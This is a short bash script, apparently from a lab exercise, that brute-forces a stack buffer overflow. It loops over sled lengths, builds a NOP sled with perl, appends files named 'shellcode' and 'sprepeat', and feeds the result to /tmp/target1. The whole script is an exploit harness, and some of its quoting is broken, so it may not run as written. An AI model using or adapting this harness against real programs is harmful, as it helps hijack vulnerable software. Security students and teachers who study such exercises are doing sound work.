#!/bin/bash
echo testing from $1 to $2...;
mycmd="(perl -e 'print \"\x90\"x$i'; cat shellcode sprepeat)";
for (( i=$1; i<=$2; i++ ))
do
  echo $i; 
  echo "print "\x90"x$i";
  echo $mycmd;
  echo eval "echo $mycmd";
  "echo $mycmd" > full_command;
  (wc full_command);
  rm full_command;
  /tmp/target1 "$mycmd";
done
